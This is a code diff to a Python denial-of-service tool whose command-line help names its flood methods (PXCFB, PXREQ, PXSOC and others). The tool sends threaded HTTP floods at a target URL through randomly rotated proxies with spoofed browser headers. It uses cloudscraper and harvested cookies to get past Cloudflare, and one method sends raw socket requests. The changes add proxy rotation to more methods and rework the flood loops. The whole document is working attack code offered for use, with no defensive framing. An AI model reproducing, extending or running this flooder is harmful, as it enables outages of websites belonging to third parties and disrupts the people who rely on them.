@@ -108,9 +108,11 @@ def get_cookies_linux(url):
     response = session.get(url, headers=headers, cookies=cookie_jar)
     cookie_jar.update(session.cookies)
     for cookie in cookie_jar:
-        cookieJAR['name']=cookie.name
-        cookieJAR['value']=cookie.value
         cookieJAR=f"{cookie.name}={cookie.value}"
+        cookieJAR = {
+            'name': cookie.name,
+            'value': cookie.value
+        }
 
     return cookie_jar
 
@@ -210,7 +212,7 @@ class Method:
 
             for thread in threads:
                 thread.join()
-        def AttackPXCFB(self, until_datetime):
+        def AttackPXCFB(self, url, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 headers = {
                     'User-Agent': UserAgent().chrome,
@@ -228,13 +230,13 @@ class Method:
                     'TE': 'trailers',
                 }
                 try:
-                    self.scraper.get(self.url, proxies={
-                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                    self.scraper.get(url, proxies={
+                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }, headers=headers)
-                    self.scraper.get(self.url, proxies={
-                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                    self.scraper.get(url, proxies={
+                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }, headers=headers)
                 except:
                     pass
@@ -248,18 +250,33 @@ class Method:
             self.thread = thread
             self.time = time
         def Attack(self):
+            headers = {
+                'User-Agent': UserAgent().chrome,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-User': '?1',
+                'TE': 'trailers',
+            }
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
             for _ in range(int(self.thread)):
-                threading.Thread(target=self.AttackPXREQ, args=(self.url, until)).start()
-        def AttackPXREQ(self, url, until_datetime):
+                threading.Thread(target=self.AttackPXREQ, args=(self.url, headers, until)).start()
+        def AttackPXREQ(self, url, headers, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     proxy = {
-                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }
-                    requests.get(url, proxies=proxy)
-                    requests.get(url, proxies=proxy)
+                    requests.get(url, proxies=proxy, headers=headers)
+                    requests.get(url, proxies=proxy, headers=headers)
                 except:
                     pass
         def start(self):
@@ -295,8 +312,8 @@ class Method:
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     proxy = {
-                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }
                     requests.get(url, proxies=proxy, verify=False)
                     self.scraper.get(url, proxies=proxy, verify=False)
@@ -305,7 +322,7 @@ class Method:
                         proxies={
                             'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                             'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                        }
+                        }, verify=False
                     )
                     self.launcher.get(url, headers=headers)
                 except:
@@ -415,6 +432,7 @@ class Method:
             self.session = requests.Session()
             self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, sess=self.session, browser='chrome')
             try:
+                get_cookie_windows(str(args.url)) if os.name == 'nt' else get_cookies_linux(str(args.url))
                 if cookieJAR:
                     jar = RequestsCookieJar()
                     jar.set(cookieJAR['name'], cookieJAR['value'])
@@ -454,8 +472,14 @@ class Method:
         def PXCFPRO(self, url, until_datetime, headers):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
-                    self.scraper.get(url, headers=headers)
-                    self.scraper.get(url, headers=headers)
+                    self.scraper.get(url, headers=headers, proxies={
+                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                        })
+                    self.scraper.get(url, headers=headers, proxies={
+                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                        })
                 except:
                     pass
 
@@ -507,7 +531,6 @@ class Method:
             self.url = url
             self.thread = thread
             self.time = time
-            self.scraper = cloudscraper.create_scraper()
 
         # Memulai thread untuk melakukan attack
         def Attack(self):
@@ -523,48 +546,51 @@ class Method:
 
         def PXSOC(self, url, until_datetime, proxy_type=socks.HTTP):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-                parsed_proxy = random.choice(open(self.proxy, 'r').readlines()).split(':')
-                proxy_host = parsed_proxy[0]
-                proxy_port = parsed_proxy[1]
-                parsed = urlparse(url)
-                self.host = parsed.hostname
-                self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
-                self.path = parsed.path if parsed.path else '/'
-                if parsed.query:
-                    self.path += '?' + parsed.query
-                # Buat socket menggunakan PySocks
-                sock = socks.socksocket()
-                sock.set_proxy(proxy_type, proxy_host, proxy_port)
-                # Hubungkan ke server melalui proxy
-                sock.connect((self.host, self.port))
-                # Jika HTTPS, wrap socket dengan SSL
-                if parsed.scheme == 'https':
-                    context = ssl.create_default_context()
-                    self.sock = context.wrap_socket(sock, server_hostname=self.host)
-
-                # Buat dan kirim HTTP request
-                request = (
-                    f"GET {self.path} HTTP/1.1\r\n"
-                    f"Host: {self.host}\r\n"
-                    f"User-Agent: {UserAgent().chrome}\r\n"
-                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-                    f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n"
-                    f"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n\r\n"
-                    f"Cache-Control: no-cache\r\n\r\n"
-                    f"Pragma: no-cache\r\n\r\n"
-                    f"Connection: keep-alive\r\n\r\n"
-                    f"Upgrade-Insecure-Requests: 1\r\n\r\n"
-                    f"Sec-Fetch-Dest: document\r\n\r\n"
-                    f"Sec-Fetch-Mode: navigate\r\n\r\n"
-                    f"Sec-Fetch-Site: same-origin\r\n\r\n"
-                    f"Sec-Fetch-User: ?1\r\n\r\n"
-                    f"TE: trailers\r\n\r\n"
-                )
                 try:
-                    sock.sendall(request.encode())
-                    sock.sendall(request.encode())
+                    parsed_proxy = random.choice(open(self.proxy, 'r').readlines()).split(':')
+                    proxy_host = parsed_proxy[0]
+                    proxy_port = parsed_proxy[1]
+                    parsed = urlparse(url)
+                    self.host = parsed.hostname
+                    self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+                    self.path = parsed.path if parsed.path else '/'
+                    if parsed.query:
+                        self.path += '?' + parsed.query
+                    # Buat socket menggunakan PySocks
+                    sock = socks.socksocket()
+                    sock.set_proxy(proxy_type, proxy_host, proxy_port)
+                    # Hubungkan ke server melalui proxy
+                    sock.connect((self.host, self.port))
+                    # Jika HTTPS, wrap socket dengan SSL
+                    if parsed.scheme == 'https':
+                        context = ssl.create_default_context()
+                        self.sock = context.wrap_socket(sock, server_hostname=self.host)
+
+                    # Buat dan kirim HTTP request
+                    request = (
+                        f"GET {self.path} HTTP/1.1\r\n"
+                        f"Host: {self.host}\r\n"
+                        f"User-Agent: {UserAgent().chrome}\r\n"
+                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
+                        f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n"
+                        f"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n\r\n"
+                        f"Cache-Control: no-cache\r\n\r\n"
+                        f"Pragma: no-cache\r\n\r\n"
+                        f"Connection: keep-alive\r\n\r\n"
+                        f"Upgrade-Insecure-Requests: 1\r\n\r\n"
+                        f"Sec-Fetch-Dest: document\r\n\r\n"
+                        f"Sec-Fetch-Mode: navigate\r\n\r\n"
+                        f"Sec-Fetch-Site: same-origin\r\n\r\n"
+                        f"Sec-Fetch-User: ?1\r\n\r\n"
+                        f"TE: trailers\r\n\r\n"
+                    )
+                    try:
+                        sock.sendall(request.encode())
+                        sock.sendall(request.encode())
+                    except:
+                        sock.close()
                 except:
-                    pass
+                    return
 
         def start(self):
             return self.Attack()
@@ -574,11 +600,7 @@ class Runner:
         self.args = args
     def start():
         with ThreadPoolExecutor(max_workers=int(args.tpe)) as executor:
-            for _ in range(int(args.tpe)):
-                if 'PX' in str(args.method).upper():
-                    exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())')
-                else:
-                    exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')
+            exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())') if 'PX' in str(args.method).upper() else exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description=f'Usage: python3 {__file__} [OPTIONS]')
@@ -589,5 +611,4 @@ if __name__ == '__main__':
     parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
     parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC', required=True)
     args = parser.parse_args()
-    get_cookie_windows(str(args.url)) if os.name == 'nt' else get_cookies_linux(str(args.url))
     threading.Thread(target=Runner.start()).start()
